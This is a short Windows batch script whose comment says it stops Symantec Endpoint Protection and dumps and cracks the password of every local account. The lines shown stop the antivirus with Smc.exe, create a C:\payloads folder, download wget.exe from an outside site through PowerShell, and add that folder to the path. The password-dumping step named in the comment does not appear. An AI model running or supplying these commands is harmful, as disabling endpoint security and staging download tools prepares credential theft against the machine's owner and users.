rem This script stops Symantec Endpoint Protection and dumps/cracks the password of every local account on the device

"C:\Program Files\Symantec\Symantec Endpoint Protection\Smc.exe" -stop

mkdir C:\payloads

powershell -command "Invoke-WebRequest -Uri https://eternallybored.org/misc/wget/1.21.3/64/wget.exe -OutFile C:\payloads\wget.exe"

set PATH=%PATH%;C:\payloads
